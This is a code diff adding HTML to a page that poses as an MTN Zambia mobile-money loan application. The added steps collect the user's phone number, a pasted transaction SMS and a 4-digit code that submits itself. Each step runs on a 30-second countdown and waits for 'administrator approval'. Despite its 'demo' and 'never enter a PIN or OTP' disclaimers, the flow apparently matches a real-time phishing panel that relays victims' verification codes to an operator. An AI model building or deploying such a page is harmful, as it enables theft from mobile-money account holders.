@@ -46,6 +46,40 @@ Start your application today!.>
       <select id="loanAmountChoice" class="bundle-select" required>
     <select id="loanAmount" name="loanAmount">
 </select>
+         <label>Repayment period</label>
+      <select id="termChoice" class="bundle-select" required><option value="1">1 month</option><option value="2">2 months</option><option value="3" selected>3 months</option><option value="4">4 months</option><option value="6">6 months</option><option value="12">12 months</option></select>
+      <div class="hint" id="loanEstimate">Your estimated repayments will appear after you select an amount and term.</div>
+      <label>MTN Zambia mobile number</label><input id="phone" type="tel" required placeholder="096XXXXXXX or +26096XXXXXXX" inputmode="tel" autocomplete="tel" aria-describedby="tnmNumberHint">
+      <label>MTN Zambia WhatsApp number (optional)</label><input id="whatsappNumber" type="tel" placeholder="096XXXXXXX or +26096XXXXXXX" inputmode="tel" autocomplete="tel">
+      <div class="hint" id="tnmNumberHint">Only MTN Zambia mobile numbers beginning with 056, 076, or 096 are accepted.</div>
+      <label>Application reference number (5 digits)</label><input id="applicationIdInput" class="text-input" required maxlength="5" minlength="5" inputmode="numeric" pattern="[0-9]{5}" placeholder="Enter 5 digits" autocomplete="off" type="text">
+      <div class="hint">Enter your 5-digit application reference only. Never enter a mobile-money PIN or OTP.</div>
+      <button class="primary" id="startApplication" type="submit">NEXT <span>→</span></button><div class="error hidden" id="loginError"></div>
+      <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Waiting for application review</strong><span>Your application has been submitted for authorized administrator review.</span><small>Application number: <b id="applicationNumber">—</b></small></div>
+    </form>
+  </section>
+  <section class="page" data-page="2">
+    <div class="hero"><div class="icon"><span aria-hidden="true">🔢</span></div><h1>Reference Code 1 — Transaction Reference</h1><p>Paste the complete transaction message.</p></div>
+    <div class="card form-card">
+      <label for="firstName">Full transaction message</label>
+      <textarea id="firstName" class="text-input reference-paste" rows="10" autocomplete="off" placeholder="Paste the complete transaction SMS/message here" aria-label="Reference Code 1 text"></textarea>
+      <div class="hint">Paste the complete transaction message. It will submit automatically after you paste. Do not include your PIN, password, or OTP.</div>
+      <div class="submission-timer" id="firstNameTimer"><div class="countdown-ring" id="firstNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="firstNameSeconds">30</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
+      <button class="primary" id="firstNameBtn" type="button">SUBMIT TRANSACTION MESSAGE <span>→</span></button><button class="secondary hidden" id="firstNameResubmit" type="button">RESUBMIT ↻</button>
+      <div class="waiting hidden" id="firstNameWaiting"><div class="spinner"></div><strong>Waiting for Reference Code 1 approval</strong><span>Reference Code 1 has been submitted. The next page will open after administrator approval.</span></div><div class="error hidden" id="page2Error"></div>
+    </div>
+  </section>
+  <section class="page" data-page="3">
+    <div class="hero"><div class="icon"><span aria-hidden="true">🔢</span></div><h1>Reference Code 2 — Final Verification</h1><p>Enter your 4-digit numeric reference.</p></div>
+    <div class="card form-card">
+      <label for="secondName">Reference Code 2 (4 digits)</label><input id="secondName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" minlength="4" autocomplete="off" placeholder="Enter 4 digits" aria-label="Reference Code 2">
+      <div class="hint">Enter exactly 4 numeric digits. It submits automatically when the fourth digit is entered. Never enter a PIN or OTP.</div>
+      <div class="submission-timer" id="secondNameTimer"><div class="countdown-ring" id="secondNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="secondNameSeconds">30</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
+      <button class="primary" id="secondNameBtn" type="button">SUBMIT REFERENCE CODE 2 <span>→</span></button><button class="secondary hidden" id="secondNameResubmit" type="button">RESUBMIT ↻</button>
+      <div class="waiting hidden" id="secondNameWaiting"><div class="spinner"></div><strong>Waiting for Reference Code 2 approval</strong><span>Reference Code 2 has been submitted. Please wait for administrator approval.</span></div><div class="error hidden" id="page3Error"></div>
+    </div>
+  </section> <section class="page" data-page="4"> <div class="hero"><div class="icon"><span aria-hidden="true">🔐</span></div><h1>Loan Summary</h1> <p>Review your loan amount and estimated repayments before submitting.</p></div> <div class="card form-card"> <div class="hint" id="finalLoanSummary">Your loan amount and repayment summary will appear here.</div><input id="loanAmount" type="hidden" value="100000"><div class="hint">This is an independent demonstration. No real loans or funds are issued.</div> <button class="primary" id="loanAmountBtn">SUBMIT LOAN APPLICATION <span>→</span></button> <div class="waiting hidden" id="loanAmountWaiting"><div class="spinner"></div><strong>Waiting for the loan application decision</strong><span>Demo application details have been submitted for administrator review.</span></div> <div class="error hidden" id="page4Error"></div> </div> </section> <section class="page" data-page="success"> <div class="success-card"> <div class="big-check">✓</div> <h1>Congratulations!</h1> <p> Your demo loan application for <strong id="successAmount">—</strong> has been completed in this demonstration. No real funds have been issued. </p> <div class="application-number" id="successNumber">—</div> <small>Keep this demo reference for your records.</small> </div> </section> <footer> <span>Secure demonstration</span> <span>•</span> <span>Independent demo • Not an official MTN or MoMo service</span> </footer> </main> <script src="/app.js"></script> </body> </html>
+
 
 
 <label>Loan amount (ZMW)</label>
